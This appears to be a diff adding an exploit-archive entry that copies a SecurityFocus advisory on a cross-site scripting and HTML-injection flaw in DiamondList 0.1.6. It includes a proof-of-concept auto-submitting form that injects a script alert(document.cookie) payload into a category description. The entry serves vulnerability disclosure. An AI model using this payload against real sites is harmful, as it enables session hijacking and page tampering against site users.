@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/42252/info
+ 
+DiamondList is prone to a cross-site scripting vulnerability and an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+ 
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+ 
+DiamondList 0.1.6 is vulnerable; prior versions may also be affected. 
+
+<form action="http://www.example.com/user/main/update_category/CATEGORY_ID" method="post"  name="main" >
+<input type="hidden" name="category[name]" value="some cat name" />
+<input type="hidden" name="category[description]" value='descr<script>alert(document.cookie)</script>' />
+<input type="hidden" name="commit" value="Update" />
+
+</form>
+<script>
+document.main.submit();
+</script>
